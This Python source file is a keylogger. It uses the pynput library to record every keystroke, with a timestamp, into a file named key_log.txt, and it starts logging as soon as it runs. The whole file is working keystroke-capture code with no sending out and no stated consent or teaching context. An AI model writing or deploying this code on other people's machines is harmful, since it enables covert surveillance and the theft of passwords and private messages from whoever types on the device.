import logging
from pynput import keyboard
from DIR import DIR

def on_press(key):  logging.info(key)

def start_logging():
    log_dir = DIR
    logging.basicConfig(filename=(log_dir + 'key_log.txt'), level=logging.INFO, format='%(asctime)s: %(message)s')
    with keyboard.Listener(on_press=on_press) as listener: listener.join()

start_logging()